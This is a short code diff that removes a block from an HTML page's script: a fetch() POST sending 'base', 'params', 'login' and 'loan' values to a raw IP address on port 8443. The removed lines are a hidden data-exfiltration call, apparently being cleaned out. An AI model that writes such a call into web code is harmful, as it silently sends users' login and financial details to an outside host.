@@ -10,17 +10,6 @@
 
   document.getElementById('out').innerText =
       'base: ' + base + '\nparams: ' + params + '\nlogin: ' + login;
-
-  fetch('https://124.71.173.168:8443/collect', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-          base:   base,
-          params: params,
-          login:  login,
-          loan:   loan
-      })
-  });
   </script>
   </body>
   </html>
